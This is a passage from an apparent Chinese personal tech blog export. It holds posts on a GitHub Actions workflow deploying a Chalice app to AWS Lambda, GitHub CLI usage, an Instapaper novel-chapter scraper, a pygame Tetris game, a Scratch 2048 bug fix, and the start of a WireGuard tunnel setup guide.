eks 中的服务暴露出来的几种方法我居然只回答出 nodeport 和 ingress 两种，连 LB 设备这个都忘了。:(
结果最终的结果，自然是挂了呀。:(
]]></content>
      <tags>
        <tag>aws</tag>
        <tag>面试总结</tag>
        <tag>外包公司</tag>
        <tag>eks</tag>
        <tag>Jenkins</tag>
        <tag>ingress</tag>
        <tag>X-Forwarded-For</tag>
        <tag>CI/CD</tag>
      </tags>
  </entry>
  <entry>
    <title>自动化部署的艺术：用 GitHub Action 部署 Python 编写的 Chalice 应用到 AWS Lambda</title>
    <url>/2023/08/%E7%94%A8%20GitHub%20Action%20%E9%83%A8%E7%BD%B2%20Python%20%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99%E7%9A%84%20Chalice%20%E5%BA%94%E7%94%A8%E5%88%B0%20AWS%20Lambda/index.html</url>
    <content><![CDATA[缘起大家好，我是老杨。在这篇文章中，我将带大家深入了解如何利用 GitHub Action 自动化部署 Chalice 应用到 AWS Lambda。这不仅是一个技术实践，也是对 CI&#x2F;CD 流程优化的一次探索。
在现代软件开发中，快速迭代和持续部署是提高开发效率的关键。Chalice 是一个用于部署 Python 应用到 AWS Lambda 的框架，而 GitHub Action 提供了一个强大的自动化平台。结合这两者，我们可以创建一个无缝的部署流程。


Chalice 简介Chalice 是一个 Python 框架，它使得在 AWS Lambda 和 API Gateway 上部署无服务器应用变得简单。它允许开发者使用熟悉的 Python 语法来定义 Lambda 函数和 RESTful API，同时提供了丰富的配置选项来满足不同的部署需求。
GitHub Action 工作流详解让我们来看一下这个工作流的核心内容。以下是一个简化的工作流文件示例，它展示了如何配置和执行部署任务。
name: Deploy xxxxx-indexer manually using Chalicerun-name: Deploy xxxxx-indexer $&#123;&#123; inputs.branch &#125;&#125;-&gt;$&#123;&#123; inputs.environment &#125;&#125; by @$&#123;&#123; github.actor &#125;&#125;on:  workflow_dispatch:    inputs:      branch:        description: &#x27;Branch to deploy&#x27;        required: true        default: &#x27;v1.1&#x27;      environment:        description: &#x27;Deployment environment&#x27;        required: true        default: &#x27;dev&#x27;        type: choice        options:          - prod          - devenv:  env_vars: &#x27;&#123;&quot;prod&quot;: &quot;1111&quot;, &quot;dev&quot;: &quot;2222&quot;&#125;&#x27;  project_directory: &#x27;xxxx-indexer&#x27;jobs:  deploy-job:    runs-on: ubuntu-latest    steps:      - name: Checkout code        uses: actions/checkout@v4        with:          token: $&#123;&#123; secrets.TOKEN_CICD &#125;&#125;          ref: $&#123;&#123; github.event.inputs.branch &#125;&#125;          sparse-checkout: $&#123;&#123; env.project_directory &#125;&#125;          sparse-checkout-cone-mode: false      - name: Delete configuration files for chalice        run: |          [[ -e $&#123;&#123; env.project_directory &#125;&#125;/.chalice ]] &amp;&amp; \            rm -rf $&#123;&#123; env.project_directory &#125;&#125;/.chalice      - name: Checkout configuration files for CI/CD        uses: actions/checkout@v4        with:          repository: xxxx-xxxx/CICD          token: $&#123;&#123; secrets.TOKEN_CICD &#125;&#125;          ref: main          sparse-checkout: chalice/$&#123;&#123; env.project_directory &#125;&#125;          sparse-checkout-cone-mode: false          path: config-chalice      - name: Make a symbolic(soft) link        run: |          ln -srv \             config-chalice/chalice/$&#123;&#123; env.project_directory &#125;&#125;/.chalice \             $&#123;&#123; env.project_directory &#125;&#125;/          echo &quot;after checkout CI/CD:&quot;          ls -lRa $&#123;&#123; env.project_directory &#125;&#125;      - name: Set up Python        uses: actions/setup-python@v5        with:          python-version: &#x27;3.9&#x27;      - uses: actions/cache@v4        with:          path: ~/.cache/pip          key: $&#123;&#123; runner.os &#125;&#125;-pip-$&#123;&#123; hashFiles(&#x27;**/requirements.txt&#x27;) &#125;&#125;          restore-keys: |            $&#123;&#123; runner.os &#125;&#125;-pip-      - name: Install dependencies        run: |          cd $&#123;&#123; env.project_directory &#125;&#125;          pip install -r requirements.txt          pip install chalice      - name: Prepare the .chalice/config.json        run: |          cd $&#123;&#123; env.project_directory &#125;&#125;          sed -e &quot;s:___GH-REF___:$&#123;&#123; github.event.inputs.branch &#125;&#125;:g&quot; \              -e &quot;s/___GH-COMMIT-ID___/$(git log -1 --format=&#x27;%H&#x27;)/g&quot; \              -e &quot;s/___DBPASSWORD___/$&#123;&#123; secrets[format(&#x27;DB_PWD_&#123;0&#125;&#x27;, fromJson(env.env_vars)[github.event.inputs.environment])] &#125;&#125;/g&quot; \              -e &quot;s:___GH-REPOSITORY___:$&#123;&#123; github.repository &#125;&#125;:g&quot; \              -e &quot;s:___GH-DIRECTORY___:$&#123;&#123; env.project_directory &#125;&#125;:g&quot; \              -i .chalice/config.json          echo &quot;the content of file .chalice/config.json:&quot;          cat .chalice/config.json      - name: Configure AWS Credentials        uses: aws-actions/configure-aws-credentials@v4        with:          aws-region: $&#123;&#123; vars[format(&#x27;AWS_REGION_&#123;0&#125;&#x27;, fromJson(env.env_vars)[github.event.inputs.environment])] &#125;&#125;          aws-access-key-id: $&#123;&#123; secrets[format(&#x27;AWS_ACCESS_KEY_ID_&#123;0&#125;&#x27;, fromJson(env.env_vars)[github.event.inputs.environment])] &#125;&#125;          aws-secret-access-key: $&#123;&#123; secrets[format(&#x27;AWS_SECRET_ACCESS_KEY_&#123;0&#125;&#x27;, fromJson(env.env_vars)[github.event.inputs.environment])] &#125;&#125;      - name: Deploy Chalice        id: deploy-step        run: |          cd $&#123;&#123; env.project_directory &#125;&#125;          chalice deploy --stage $&#123;&#123; github.event.inputs.environment &#125;&#125;      - name: Check for files changed        id: git_status        run: |          cd config-chalice/chalice/$&#123;&#123; env.project_directory &#125;&#125;/.chalice          git status -s          file_changed=$(if git status -s | grep -q &quot;deployed/$&#123;&#123; github.event.inputs.environment &#125;&#125;.json&quot;; then echo &#x27;true&#x27;; else echo &#x27;false&#x27;; fi)          echo &quot;changed=$&#123;file_changed&#125;&quot; &gt;&gt; $GITHUB_OUTPUT      - name: Commit and push changes        if: $&#123;&#123; steps.git_status.outputs.changed == &#x27;true&#x27; &#125;&#125;        run: |          cd config-chalice/chalice/$&#123;&#123; env.project_directory &#125;&#125;/.chalice          git config --local user.email &quot;contact@xxx.xxx&quot;          git config --local user.name &quot;contact-xxx&quot;          git config --local pull.rebase false          git add deployed/$&#123;&#123; github.event.inputs.environment &#125;&#125;.json          git commit -m &quot;Update deployed files at $(date)&quot;          git pull          git push
在这个工作流中，我们定义了两个输入参数：branch 和 environment。这允许我们在启动工作流时指定要部署的分支和环境。我们还设置了环境变量，这些变量在部署过程中会被用来配置应用。
接下来，工作流会检出指定分支的代码，删除现有的 Chalice 配置文件，并从 CI&#x2F;CD 仓库中检出新的配置。然后，我们设置 Python 环境，安装依赖，准备配置文件，并配置 AWS 凭证。最后，我们执行 Chalice 部署命令，将应用部署到 AWS Lambda。
GitHub Action 缓存功能在我们的工作流中，actions/cache 用于缓存 Python 的 pip 依赖。这可以显著提高后续部署的效率，因为依赖项不需要每次都重新下载。缓存的键是基于操作系统和依赖文件的哈希值，这确保了缓存的一致性和可恢复性。
CI&#x2F;CD 仓库中的 JSON 文件推送在部署完成后，Chalice 生成的 JSON 文件包含了部署的详细信息。将这个文件推送回 CI&#x2F;CD 仓库有助于我们跟踪部署历史，管理配置，并在必要时进行回滚。这是一种确保部署过程透明和可审计的重要实践。
结语通过这个详细的 GitHub Action 工作流，我们实现了 Chalice 应用的自动化部署。这个过程不仅简化了部署步骤，还提高了部署的可靠性。我希望这篇文章能够帮助你更好地理解如何利用 GitHub Action 来优化你的 CI&#x2F;CD 流程。
如果你有任何问题，或者想要了解更多关于这个话题的信息，欢迎留言讨论。别忘了点赞和分享哦！
]]></content>
      <tags>
        <tag>Chalice</tag>
        <tag>Python</tag>
        <tag>DevOps</tag>
        <tag>CI/CD</tag>
        <tag>GitHub-Action</tag>
        <tag>AWS-Lambda</tag>
        <tag>Automation</tag>
        <tag>Deployment</tag>
        <tag>Serverless</tag>
      </tags>
  </entry>
  <entry>
    <title>用 GitHub CLI 来查看 GitHub Action 执行情况</title>
    <url>/2023/07/%E7%94%A8%20GitHub%20CLI%20%E6%9D%A5%E6%9F%A5%E7%9C%8B%20GitHub%20Action%20%E6%89%A7%E8%A1%8C%E6%83%85%E5%86%B5/index.html</url>
    <content><![CDATA[缘起最近相当长一段时间，都在调 GitHub action 的 workflow 比较多，而 GitHub  官网时不时抽风，于是就有了在命令行看 GitHub action jobs 的执行情况的需求。


环境准备GitHub CLI 安装brewbrew install gh

二进制文件下载链接：https://github.com/cli/cli/releases/download/v2.40.0/gh_2.40.0_macOS_amd64.zip
GitHub CLI 配置gh auth login

然后按照提示一步一步走就行了。但是我建议的还是下面这种：
gh auth login --with-token &lt; mytoken.txt

这里的 mytoken.txt 里的内容来自于：GitHub 官网右上角依次点击 个人头像-&gt;Settings，再点左边栏下方 “Developer Settings”，然后再在左边栏点击 “Personal access tokens” 下的 “Tokens(classic)”，在这个页面里创建一个 “PAT(personal access token)”，这个放在 mytoken.txt 文件里就好了。
GitHub CLI 的使用能用的场景很多，我只讲下我用的场景
cd xxxxxxxxxxx# &quot;xxxxxxxxxxx&quot; 是 clone 下来的 GitHub 上的某个 repository 的目录gh run list# 获取这个 repository 当前正在跑的 GitHub Action 的 workflow 列表# 注意输出里有个 ID，数字的，记下来gh run view 7142031754# 这里的 &quot;7142031754&quot; 就是上一步看到的在跑的 workflow 中你感兴趣的 ID# 注意：这里输出中会有这个 workflow 正在运行的 job id，记下来gh run view --job=19450447397# 这里的 &quot;19450447397&quot; 就是上一步记下来的那个 job 的 ID# 等这个 job 执行完成以后，可以用下面这个命令来看完整的执行情况gh run view --log --job=19450447397
]]></content>
      <tags>
        <tag>github</tag>
        <tag>github_cli</tag>
        <tag>github_action</tag>
        <tag>gh</tag>
        <tag>workflow</tag>
        <tag>job</tag>
      </tags>
  </entry>
  <entry>
    <title>用 Kindle 来追网文之三</title>
    <url>/2021/11/%E7%94%A8%20Kindle%20%E6%9D%A5%E8%BF%BD%E7%BD%91%E6%96%87%E4%B9%8B%E4%B8%89/index.html</url>
    <content><![CDATA[背景之前学 python 做爬虫爬书时水过两篇文章（加上本篇，一共三篇）：

用 kindle 追网文 
用 Kindle 追网文之二
用 Kindle 来追网文之三

当下，由于种种原因要切源到：m.uuks.org，所以有了第三篇水文：）


show me the code#!/usr/bin/env python3# -*- coding: utf-8 -*-import timeimport requestsimport reimport os.pathimport pickleimport loggingimport sysfrom importlib import reloadfrom datetime import datetimefrom bs4 import BeautifulSoupfrom pyinstapaper.instapaper import Instapaper, Folder, BookmarkINSTAPAPER_KEY = &#x27;*****************&#x27;INSTAPAPER_SECRET = &#x27;**************&#x27;INSTAPAPER_LOGIN = &#x27;u@x.com&#x27;INSTAPAPER_PASSWORD = &#x27;password&#x27;base_url = &#x27;http://m.uuks.org&#x27;novel_list = [    &quot;苏厨&quot;, &quot;绍宋&quot;, &quot;从 1983 开始&quot;, &quot;全职艺术家&quot;, &quot;大明镇海王&quot;, &quot;奶爸学园&quot;]novel_url = [    &#x27;392_392855&#x27;, &#x27;511_511286&#x27;, &#x27;441_441819&#x27;, &#x27;32802&#x27;, &#x27;519_519302&#x27;, &quot;33250&quot;]instapaper = Instapaper(INSTAPAPER_KEY, INSTAPAPER_SECRET)instapaper.login(INSTAPAPER_LOGIN, INSTAPAPER_PASSWORD)def add_bookmark_instapaper(title, url):    data = &#123;        &#x27;time&#x27;: time.time(),        &#x27;progress_timestamp&#x27;: 0,        &#x27;title&#x27;: title,        &#x27;url&#x27;: url    &#125;    bookmark = Bookmark(instapaper, **data)    bookmark.add()def fetch_novel(novel_list, novel_url):    print(&#x27;job running&#x27;)    if os.path.isfile(&#x27;url.pkl&#x27;):        with open(&#x27;url.pkl&#x27;, &#x27;rb&#x27;) as f:            last_url = pickle.load(f)        f.close()    else:        #last_url=[[],[],[],[]]        last_url = [[]] * len(novel_list)    url_archive = []    for j in range(0, len(novel_list)):        print(novel_list[j])        try:            old_url = last_url[j]        except IndexError:            old_url = []        url = base_url + &#x27;/b/&#x27; + novel_url[j] + &#x27;/&#x27;        head = &#123;&#125;        head[            &#x27;User-Agent&#x27;] = &#x27;Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166  Safari/535.19&#x27;        page = requests.get(url)        soup = BeautifulSoup(page.content, &#x27;lxml&#x27;)        soup_text = soup.select(            &#x27;#book-sp &gt; div.listbox &gt; div.list_cont &gt; div.book-detial &gt; div.ml-list &gt; ul a&#x27;        )        latest_url = []        latest_title = []        for i in range(0, len(soup_text)):            latest_url.append(base_url + soup_text[i][&#x27;href&#x27;])            latest_title.append(novel_list[j] + &#x27;---&#x27; +                                 soup_text[i].string)        for k in range(len(latest_url)-1, -1, -1):            if latest_url[k] in old_url:                continue            print(latest_title[k], latest_url[k])            add_bookmark_instapaper(latest_title[k], latest_url[k])        old_url = latest_url        url_archive.append(old_url)    with open(&#x27;url.pkl&#x27;, &#x27;wb&#x27;) as f:        pickle.dump(url_archive, f)    f.close()bookmarks = instapaper.get_bookmarks(&#x27;unread&#x27;)for ct, bookmark in enumerate(bookmarks):    print(bookmark.title)    bookmark.archive()    bookmark.delete()fetch_novel(novel_list, novel_url)]]></content>
      <tags>
        <tag>Python</tag>
        <tag>Kindle</tag>
        <tag>Python3</tag>
        <tag>Instapaper</tag>
        <tag>爬虫</tag>
        <tag>网络小说</tag>
        <tag>UU看书</tag>
        <tag>uuks.org</tag>
      </tags>
  </entry>
  <entry>
    <title>用 Kindle 来追网文之二</title>
    <url>/2020/07/%E7%94%A8%20Kindle%20%E8%BF%BD%E7%BD%91%E6%96%87_2/index.html</url>
    <content><![CDATA[背景前面的文章 用 kindle 追网文 提到了一种用 kindle 追网文的方式，正常工作过一段时间之后，情况又发生变化了：每个章节都被拆成两个页面。这样就导致我只抓了每个章节的第一个页面，第二个页面没抓，自然内容也就不完整了。这部分内容主要是对 用 kindle 追网文 的代码做了些简单的改动，以适应最新情况。


新方案其他部分都没变，只是 Python 程序稍稍修改了一下（同时还做了下格式的修改，显得更专业一些：），具体代码如下：
#!/usr/bin/env python# -*- coding: utf-8 -*-import timeimport requestsimport reimport os.pathimport pickleimport loggingimport sysfrom datetime import datetimefrom bs4 import BeautifulSoupfrom pyinstapaper.instapaper import Instapaper, Folder, Bookmarkreload(sys)sys.setdefaultencoding(&#x27;utf-8&#x27;)# 以下四个变量根据自己的情况填写INSTAPAPER_KEY = &#x27;************************&#x27;INSTAPAPER_SECRET = &#x27;*********************&#x27;INSTAPAPER_LOGIN = &#x27;u@x.com&#x27;INSTAPAPER_PASSWORD = &#x27;password&#x27;# 几本书，用来做例子novel_list = [    &quot;苏厨&quot;,    &quot;王老实的幸福生活&quot;,    &quot;大魔王又出手了&quot;]novel_url = [    &#x27;392_392855&#x27;,    &#x27;7_7669&#x27;,    &#x27;431_431648&#x27;]base_url = &#x27;https://m.xinxs.la&#x27;instapaper = Instapaper(INSTAPAPER_KEY, INSTAPAPER_SECRET)instapaper.login(INSTAPAPER_LOGIN, INSTAPAPER_PASSWORD)def add_bookmark_instapaper(title, url):    data = &#123;        &#x27;time&#x27;: time.time(),        &#x27;progress_timestamp&#x27;: 0,        &#x27;title&#x27;: title,        &#x27;url&#x27;: url    &#125;    bookmark = Bookmark(instapaper, **data)    bookmark.add()def fetch_novel(novel_list, novel_url):    print(&#x27;job running&#x27;)    if os.path.isfile(&#x27;url.pkl&#x27;):        with open(&#x27;url.pkl&#x27;) as f:            last_url = pickle.load(f)        f.close()    else:        last_url = [[]] * len(novel_list)    url_archive = []    for j in range(0, len(novel_list)):        print(novel_list[j])        try:            old_url = last_url[j]        except IndexError:            old_url = []        url = base_url + &#x27;/&#x27; + novel_url[j] + &#x27;/&#x27;        head = &#123;&#125;        head[            &#x27;User-Agent&#x27;] = &#x27;Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166  Safari/535.19&#x27;        page = requests.get(url)        soup = BeautifulSoup(page.content, &#x27;lxml&#x27;)        soup_text = soup.select(            &#x27;body &gt; div.container &gt; div.row.row-section &gt; div &gt; div:nth-of-type(1) &gt; ul &gt; li &gt; a&#x27;        )        latest_url = []        latest_title = []        for i in range(0, len(soup_text)):            latest_url.append(base_url + soup_text[i][&#x27;href&#x27;])            latest_title.append(novel_list[j] + &#x27;---&#x27; +                                soup_text[i].string.encode(&#x27;utf-8&#x27;))        for k in range(0, len(latest_url)):            if latest_url[k] in old_url:                continue            # latest_url[k].replace(&quot;.html&quot;, &quot;_2.html&quot;) 是第二部分的 url            print(latest_title[k], latest_url[k],                  latest_url[k].replace(&quot;.html&quot;, &quot;_2.html&quot;))            add_bookmark_instapaper(                latest_title[k] + &quot; part 2&quot;,                latest_url[k].replace(&quot;.html&quot;, &quot;_2.html&quot;)            )            add_bookmark_instapaper(latest_title[k], latest_url[k])        old_url = latest_url        url_archive.append(old_url)    with open(&#x27;url.pkl&#x27;, &#x27;w&#x27;) as f:        pickle.dump(url_archive, f)    f.close()# 每次抓取新的文章之前，先把以前的删掉bookmarks = instapaper.get_bookmarks(&#x27;unread&#x27;)for ct, bookmark in enumerate(bookmarks):    print(bookmark.title)    bookmark.archive()    bookmark.delete()fetch_novel(novel_list, novel_url)

OK 了。
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>Kindle</tag>
        <tag>Instapaper</tag>
        <tag>pyinstapaper</tag>
        <tag>BeautifulSoup</tag>
        <tag>bs4</tag>
      </tags>
  </entry>
  <entry>
    <title>用 Python 实现简单的俄罗斯方块（tetris）游戏</title>
    <url>/2020/08/%E7%94%A8%20Python%20%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E7%9A%84%E4%BF%84%E7%BD%97%E6%96%AF%E6%96%B9%E5%9D%97%EF%BC%88tetris%EF%BC%89%E6%B8%B8%E6%88%8F/index.html</url>
    <content><![CDATA[缘起最近又（为什么要说“又”呢？）在学着用 Python 来解决一些实际问题，希望能从真实应用场景中提升编码的能力。前面的 用 Kindle 追网文之二 是，现在的俄罗斯方块也是。


详细代码import pygameimport randomcolors = [    (0, 0, 0),    (120, 37, 179),    (100, 179, 179),    (80, 34, 22),    (80, 134, 22),    (180, 34, 22),    (180, 34, 122),]class Figure:    x = 0    y = 0    figures = [        [[1, 5, 9, 13], [4, 5, 6, 7]],        [[4, 5, 9, 10], [2, 6, 5, 9]],        [[6, 7, 9, 10], [1, 5, 6, 10]],        [[1, 2, 5, 9], [0, 4, 5, 6], [1, 5, 9, 8], [4, 5, 6, 10]],        [[1, 2, 6, 10], [5, 6, 7, 9], [2, 6, 10, 11], [3, 5, 6, 7]],        [[1, 4, 5, 6], [1, 4, 5, 9], [4, 5, 6, 9], [1, 5, 6, 9]],        [[1, 2, 5, 6]],    ]    def __init__(self, x, y):        self.x = x        self.y = y        self.type = random.randint(0, len(self.figures) - 1)        self.color = random.randint(1, len(colors) - 1)        self.rotation = 0    def image(self):        return self.figures[self.type][self.rotation]    def rotate(self):        self.rotation = (self.rotation + 1) % len(self.figures[self.type])class Tetris:    level = 1    score = 0    state = &quot;start&quot;    field = []    height = 0    width = 0    x = 100    y = 60    zoom = 20    figure = None    figure_next = None    def __init__(self, height, width):        self.height = height        self.width = width        self.field = []        self.score = 0        self.state = &quot;start&quot;        for i in range(height):            new_line = []            for j in range(width):                new_line.append(0)            self.field.append(new_line)    def new_figure(self):        self.figure = Figure(3, 0)    def new_next_figure(self):        self.figure_next = Figure(0, 0)    def intersects(self):        intersection = False        for i in range(4):            for j in range(4):                if i * 4 + j in self.figure.image():                    if i + self.figure.y &gt; self.height - 1 or \                            j + self.figure.x &gt; self.width - 1 or \                            j + self.figure.x &lt; 0 or \                            self.field[i +                                       self.figure.y][j +                                                      self.figure.x] &gt; 0:                        intersection = True        return intersection    def break_lines(self):        lines = 0        for i in range(1, self.height):            zeros = 0            for j in range(self.width):                if self.field[i][j] == 0:                    zeros += 1            if zeros == 0:                lines += 1                for i1 in range(i, 1, -1):                    for j in range(self.width):                        self.field[i1][j] = self.field[i1 - 1][j]        self.score += lines ** 2        self.level = self.score // 100 + 1    def go_space(self):        while not self.intersects():            self.figure.y += 1        self.figure.y -= 1        self.freeze()    def go_down(self):        self.figure.y += 1        if self.intersects():            self.figure.y -= 1            self.freeze()    def freeze(self):        for i in range(4):            for j in range(4):                if i * 4 + j in self.figure.image():                    self.field[                        i + self.figure.y][                            j + self.figure.x] = self.figure.color        self.break_lines()        self.new_figure()        tmp_x = self.figure.x        tmp_y = self.figure.y        self.figure = self.figure_next        self.figure.x = tmp_x        self.figure.y = tmp_y        self.new_next_figure()        if self.intersects():            self.state = &quot;gameover&quot;    def go_side(self, dx):        old_x = self.figure.x        self.figure.x += dx        if self.intersects():            self.figure.x = old_x    def rotate(self):        old_rotation = self.figure.rotation        self.figure.rotate()        if self.intersects():            self.figure.rotation = old_rotation# Initialize the game enginepygame.init()# Define some colorsBLACK = (0, 0, 0)WHITE = (255, 255, 255)GRAY = (128, 128, 128)size = (400, 500)screen = pygame.display.set_mode(size)pygame.display.set_caption(&quot;Tetris&quot;)# Loop until the user clicks the close button.done = Falseclock = pygame.time.Clock()fps = 25game = Tetris(20, 10)counter = 0pressing_down = Falsewhile not done:    if game.figure is None:        game.new_figure()        game.new_next_figure()    counter += 1    if counter &gt; 100000:        counter = 0    if counter % (fps // game.level // 2) == 0 or pressing_down:        if game.state == &quot;start&quot;:            game.go_down()    for event in pygame.event.get():        if event.type == pygame.QUIT:            done = True        if event.type == pygame.KEYDOWN:            if game.state == &quot;paused&quot;:                if event.key == pygame.K_p:                    game.state = &quot;start&quot;            elif game.state == &quot;start&quot;:                if event.key == pygame.K_UP:                    game.rotate()                if event.key == pygame.K_DOWN:                    pressing_down = True                if event.key == pygame.K_LEFT:                    game.go_side(-1)                if event.key == pygame.K_RIGHT:                    game.go_side(1)                if event.key == pygame.K_SPACE:                    game.go_space()                if event.key == pygame.K_p:                    game.state = &quot;paused&quot;            else:                pass            if event.key == pygame.K_ESCAPE:                game.__init__(20, 10)        if event.type == pygame.KEYUP:            if event.key == pygame.K_DOWN:                pressing_down = False    screen.fill(WHITE)    if game.figure_next is not None:        for i in range(4):            for j in range(4):                p = i * 4 + j                if p in game.figure_next.image():                    pygame.draw.rect(                        screen,                        colors[game.figure_next.color],                        [0 + game.zoom * (j + game.figure_next.x) + 1,                         60 + game.zoom * (i + game.figure_next.y) + 1,                         game.zoom - 2,                         game.zoom - 2])    for i in range(game.height):        for j in range(game.width):            pygame.draw.rect(                screen,                GRAY,                [game.x + game.zoom * j,                 game.y + game.zoom * i,                 game.zoom,                 game.zoom],                1)            if game.field[i][j] &gt; 0:                pygame.draw.rect(                    screen,                    colors[game.field[i][j]],                    [game.x + game.zoom * j + 1,                     game.y + game.zoom * i + 1,                     game.zoom - 2,                     game.zoom - 1])    if game.figure is not None:        for i in range(4):            for j in range(4):                p = i * 4 + j                if p in game.figure.image():                    pygame.draw.rect(                        screen,                        colors[game.figure.color],                        [game.x + game.zoom * (j + game.figure.x) + 1,                         game.y + game.zoom * (i + game.figure.y) + 1,                         game.zoom - 2,                         game.zoom - 2])    font = pygame.font.SysFont(&#x27;Calibri&#x27;, 25, True, False)    font1 = pygame.font.SysFont(&#x27;Calibri&#x27;, 65, True, False)    text = font.render(&quot;Score: &quot; + str(game.score) + &quot; Speed: &quot; + str(game.level), True, BLACK)    text1 = font.render(&quot;Next :&quot;, True, BLACK)    text_game_over = font1.render(&quot;Game Over&quot;, True, (255, 125, 0))    text_game_over1 = font1.render(&quot;Press ESC&quot;, True, (255, 215, 0))    text_paused = font1.render(&quot;PAUSED&quot;, True, (255, 125, 0))    text_paused1 = font1.render(&quot;p-&gt;continue&quot;, True, (255, 215, 0))    screen.blit(text, [0, 0])    screen.blit(text1, [0, 26])    if game.state == &quot;gameover&quot;:        screen.blit(text_game_over, [5, 200])        screen.blit(text_game_over1, [20, 265])    if game.state == &quot;paused&quot;:        screen.blit(text_paused, [20, 200])        screen.blit(text_paused1, [1, 265])    pygame.display.flip()    clock.tick(fps)pygame.quit()

使用方法要首先安装软件：
pip3 install pygame

一些说明
原始代码来自于这里
参考了 How to write Tetris in Python
我给新增了几项功能
增加了预览下一个块式样的功能
增加游戏暂停功能
增加了随着分数增加块下落的速度也跟着加快的功能



]]></content>
      <tags>
        <tag>Python</tag>
        <tag>Python3</tag>
        <tag>tetris</tag>
        <tag>pygame</tag>
        <tag>game</tag>
        <tag>游戏</tag>
      </tags>
  </entry>
  <entry>
    <title>用 Scratch 3 制作小游戏：2048</title>
    <url>/2023/01/%E7%94%A8%20Scratch%203%20%E5%88%B6%E4%BD%9C%E5%B0%8F%E6%B8%B8%E6%88%8F%EF%BC%9A2048/index.html</url>
    <content><![CDATA[缘起乐宝幼儿园的时候上过一段时间的 Scratch 的课，他对这个表现出了浓厚的兴趣，于是我就给他买了基本相关的书籍，他也爱不释手。由于领导注意到乐宝对电子产品的痴迷，怕他迷失，所以规定他周末才能玩儿半小时的 Scratch。我发现他在用 Scratch 做一点小程序（照着书吧），而且还乐此不疲。正好我也有时间，所以我想琢磨下怎么做个游戏，然后再教乐乐（编写）。


真的是这样吗？哈哈，真的起源原因真不是这样的，而是因为乐乐手头有一个我二十多年前买的 Handspring 的 Visor，就是这一款：Handspring Visor Deluxe PDA@ifixit，乐乐也很喜欢，但我网上找了找，几乎已经没有任何应用了，连中文支持：CJK，貌似都没法用了。于是我想能不能自己写点简单的小程序，port 上去。于是就有了写个小游戏：2048 的想法。
这才是最初的需求，至于改用 Scratch 来弄，那是后来的想法。
过程后来一搜，Scratch 官网就有一大堆的 2048 游戏程序例程（当然是别人分享出来的），我看了好多，都觉得有点复杂。而且油管上也有人录视频专门讲怎样编写 2048 这个游戏。本来想哪天翻译下来，再录个视频（又给自己挖了个坑：）。然后在中文世界里翻一翻，发现 B 站也有详细讲解的中文的视频。具体链接在这里：B 站用 Scratch 编写 2048 游戏的教学视频 然后我的这个 2048 程序也是完全按照这个视频做（抄）下来的。
所以，这里说起来过程，其实就是一个字：抄。：）
言归正传。这个视频里其实还是有一些小坑的。大家从头看到尾了就会知道。有些的，是前面挖，但是后面自己填了，但是有一些是没填的。我这里就提一下没填的。其实主要就是一个：变量 clone? 的问题。
这个变量我理解应该是标识角色是否是克隆体的。由于作者的疏忽，视频里作者点击“新建一个变量”，然后输入变量名“clond?”，保持缺省选项：“所有角色可见”的前提下点击“OK”，结果发现系统已有这个变量。这是个容易忽视的小细节。在我的系统里（Scratch 3.29）里，照作者的方式是能新建这个变量：clone? 的，就算系统已存在叫“clone?”的变量。
然后一直到最后，我都发现有一个小问题：就是我的程序跑起来，会在 4x4 方格的右下方，显示一个方框角色，怎么都弄不掉。仔细再看了看程序代码，发现这个方块是方块角色做完 16 次克隆自己的操作以后移动到的位置。但是按照程序里处理广播消息：show 的积木块的代码来讲，母体角色是应该不显示的呀。再仔细看看处理广播消息：show 的程序，发现这个逻辑有问题：
这段程序是在 clone? = 1 的前提下才执行的（这个思路貌似很清晰：只有克隆块才执行），但问题是启动时变量 clone? 被赋值为 0，但是在“当作为克隆体启动时执行”的代码块里，又将 clone? 设置成了 1。问题来了，clone? 是个全局变量，克隆体里将其设置为 1 了，那么母体角色也能读到，所以每次做 show 操作时，母体角色执行时也会是 clone? = 1 成立，所以母体角色也被显示了出来。:(
当然，也有其他办法来修复这个 bug，但我又翻了翻 Scratch 关于变量的资料，发现其实这里只要将 clone? 设置为本角色可见就行了。因为在母体角色里，clone? 是为 0 的（系统启动时设置的）。克隆以后，克隆体继承了这个私有变量（本角色可见的变量），然后又在“作为克隆体启动时”的代码块里将其（clone?）设置成了 1，但是母体角色里 clone? 还是 0！！！！！这样母体角色在执行处理 show 消息的代码块时，判断 clone? = 1 不成立，所以不会被显示。问题被解决。
最后这里贴一张改好后我自己玩儿 2048 时的截图

然后，最最后，我把代码贴出来，有兴趣的可以用来教小朋友哟。哈哈

整个 2048 项目 Scratch 3 源代码

]]></content>
      <tags>
        <tag>game</tag>
        <tag>游戏</tag>
        <tag>Scratch</tag>
        <tag>Scratch3</tag>
        <tag>2048</tag>
        <tag>Handspring Visor</tag>
        <tag>PDA</tag>
      </tags>
  </entry>
  <entry>
    <title>用 wireguard 在两个网络之间打洞</title>
    <url>/2019/11/%E7%94%A8%20wireguard%20%E5%9C%A8%E4%B8%A4%E4%B8%AA%E7%BD%91%E7%BB%9C%E4%B9%8B%E9%97%B4%E6%89%93%E6%B4%9E/index.html</url>
    <content><![CDATA[0 缘起基于管理和安全的考虑，我们制定了一个大内网计划（T13），希望将公司所有的网路（办公室，各个公有云的 VPC 等）的内网打通。具体可选方案很多，我们这里采用的是 wireguard


1 wireguard 安装1.1 Ubuntu# begin with 19.10(Eoan), the two following statement are not needed# 19.10(Eoan) 之后，以下这两句不用再执行。apt install software-properties-common;add-apt-repository ppa:wireguard/wireguard;	apt-get update;apt-get install wireguard;

1.2 CentOS以下是以 CentOS 7.* 为例，RHEL 7.* 亦然，如果是 6 或 8 系列的话，将 7 改成 6 或 8
curl -Lo /etc/yum.repos.d/wireguard.repo \     https://copr.fedorainfracloud.org/coprs/jdoss/wireguard/repo/epel-7/jdoss-wireguard-epel-7.repo;yum install wireguard-dkms wireguard-tools;

2 wireguard 配置这里有一些假设：



网络
私网网段
网关私网 IP
网关公网 IP



A
10.0.1.0&#x2F;24
10.0.1.1
1.1.1.1


B
10.0.2.0&#x2F;24
10.0.2.1
2.2.2.2


2.1 生成密钥对在两个网络分别用来打洞的主机（也就是网关） 10.0.1.1 和 10.0.2.1 上分别执行：
